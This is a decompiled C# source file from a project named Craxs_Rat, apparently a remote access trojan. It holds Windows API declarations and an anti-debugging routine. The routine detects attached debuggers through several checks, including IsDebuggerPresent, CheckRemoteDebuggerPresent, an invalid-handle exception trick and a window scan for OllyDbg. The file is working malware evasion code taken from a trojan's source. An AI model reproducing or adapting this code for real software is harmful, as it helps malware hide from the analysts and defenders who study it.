using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Craxs_Rat
{
	// Token: 0x02000018 RID: 24
	internal class NativeMethods
	{
		// Token: 0x060001D9 RID: 473
		[DllImport("kernel32.dll", ExactSpelling = true)]
		internal static extern void SetLastError(uint dwErrCode);

		// Token: 0x060001DA RID: 474
		[DllImport("kernel32.dll", ExactSpelling = true)]
		internal static extern int CloseHandle(IntPtr hObject);

		// Token: 0x060001DB RID: 475
		[DllImport("kernel32.dll", ExactSpelling = true)]
		internal static extern IntPtr OpenProcess(uint dwDesiredAccess, int bInheritHandle, uint dwProcessId);

		// Token: 0x060001DC RID: 476
		[DllImport("kernel32.dll", ExactSpelling = true)]
		internal static extern uint GetCurrentProcessId();

		// Token: 0x060001DD RID: 477
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern IntPtr LoadLibrary(string lpLibFileName);

		// Token: 0x060001DE RID: 478
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		internal static extern NativeMethods.Delegate0 GetProcAddress(IntPtr hModule, string lpProcName);

		// Token: 0x060001DF RID: 479
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		internal static extern NativeMethods.Delegate1 GetProcAddress(IntPtr hModule, string lpProcName);

		// Token: 0x060001E0 RID: 480
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		internal static extern NativeMethods.Delegate4 GetProcAddress(IntPtr hModule, string lpProcName);

		// Token: 0x060001E1 RID: 481
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		internal static extern NativeMethods.Delegate2 GetProcAddress(IntPtr hModule, string lpProcName);

		// Token: 0x060001E2 RID: 482
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		internal static extern NativeMethods.Delegate3 GetProcAddress(IntPtr hModule, string lpProcName);

		// Token: 0x060001E3 RID: 483
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
		internal static extern NativeMethods.Delegate6 GetProcAddress(IntPtr hModule, string lpProcName);

		// Token: 0x060001E4 RID: 484 RVA: 0x000107EC File Offset: 0x0000E9EC
		private static int smethod_0(IntPtr intptr_0, IntPtr intptr_1)
		{
			string[] array = new string[]
			{
				"OLLYDBG"
			};
			string strA = NativeMethods.smethod_1(intptr_0);
			foreach (string strB in array)
			{
				if (string.Compare(strA, strB, true) == 0)
				{
					NativeMethods.bool_0 = true;
					return 0;
				}
			}
			return 1;
		}

		// Token: 0x060001E5 RID: 485
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		internal static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

		// Token: 0x060001E6 RID: 486 RVA: 0x00010848 File Offset: 0x0000EA48
		internal static string smethod_1(IntPtr intptr_0)
		{
			StringBuilder stringBuilder = new StringBuilder(260);
			NativeMethods.GetClassName(intptr_0, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x00010874 File Offset: 0x0000EA74
		internal static bool smethod_3()
		{
			try
			{
				if (Debugger.IsAttached)
				{
					return true;
				}
				IntPtr hModule = NativeMethods.LoadLibrary("kernel32.dll");
				NativeMethods.Delegate2 procAddress = NativeMethods.GetProcAddress(hModule, "IsDebuggerPresent");
				if (procAddress != null && procAddress() != 0)
				{
					return true;
				}
				uint currentProcessId = NativeMethods.GetCurrentProcessId();
				IntPtr intPtr = NativeMethods.OpenProcess(1024U, 0, currentProcessId);
				if (intPtr != IntPtr.Zero)
				{
					try
					{
						NativeMethods.Delegate4 procAddress2 = NativeMethods.GetProcAddress(hModule, "CheckRemoteDebuggerPresent");
						if (procAddress2 != null)
						{
							int num = 0;
							if (procAddress2(intPtr, ref num) != 0 && num != 0)
							{
								return true;
							}
						}
					}
					finally
					{
						NativeMethods.CloseHandle(intPtr);
					}
				}
				bool flag = false;
				try
				{
					NativeMethods.CloseHandle(new IntPtr(305419896));
				}
				catch
				{
					flag = true;
				}
				if (flag)
				{
					return true;
				}
				try
				{
					IntPtr hModule2 = NativeMethods.LoadLibrary("user32.dll");
					NativeMethods.Delegate6 procAddress3 = NativeMethods.GetProcAddress(hModule2, "EnumWindows");
					if (procAddress3 != null)
					{
						NativeMethods.bool_0 = false;
						procAddress3(new NativeMethods.Delegate5(NativeMethods.smethod_0), IntPtr.Zero);
						if (NativeMethods.bool_0)
						{
							return true;
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0400006B RID: 107
		private static bool bool_0;

		// Token: 0x02000019 RID: 25
		[StructLayout(LayoutKind.Sequential)]
		internal class Class5
		{
			// Token: 0x0400006C RID: 108
			internal IntPtr intptr_0;

			// Token: 0x0400006D RID: 109
			internal IntPtr intptr_1;

			// Token: 0x0400006E RID: 110
			internal IntPtr intptr_2;

			// Token: 0x0400006F RID: 111
			internal IntPtr intptr_3;

			// Token: 0x04000070 RID: 112
			internal IntPtr intptr_4;

			// Token: 0x04000071 RID: 113
			internal IntPtr intptr_5;
		}

		// Token: 0x0200001A RID: 26
		// (Invoke) Token: 0x060001EA RID: 490
		internal delegate int Delegate0(IntPtr intptr_0, int int_0, NativeMethods.Class5 class5_0, uint uint_0, out uint uint_1);

		// Token: 0x0200001B RID: 27
		// (Invoke) Token: 0x060001EE RID: 494
		internal delegate int Delegate1(IntPtr intptr_0, int int_0, out uint uint_0, uint uint_1, out uint uint_2);

		// Token: 0x0200001C RID: 28
		// (Invoke) Token: 0x060001F2 RID: 498
		internal delegate int Delegate2();

		// Token: 0x0200001D RID: 29
		// (Invoke) Token: 0x060001F6 RID: 502
		internal delegate void Delegate3([MarshalAs(UnmanagedType.LPStr)] string string_0);

		// Token: 0x0200001E RID: 30
		// (Invoke) Token: 0x060001FA RID: 506
		internal delegate int Delegate4(IntPtr intptr_0, ref int int_0);

		// Token: 0x0200001F RID: 31
		// (Invoke) Token: 0x060001FE RID: 510
		internal delegate int Delegate5(IntPtr intptr_0, IntPtr intptr_1);

		// Token: 0x02000020 RID: 32
		// (Invoke) Token: 0x06000202 RID: 514
		internal delegate int Delegate6(NativeMethods.Delegate5 delegate5_0, IntPtr intptr_0);
	}
}
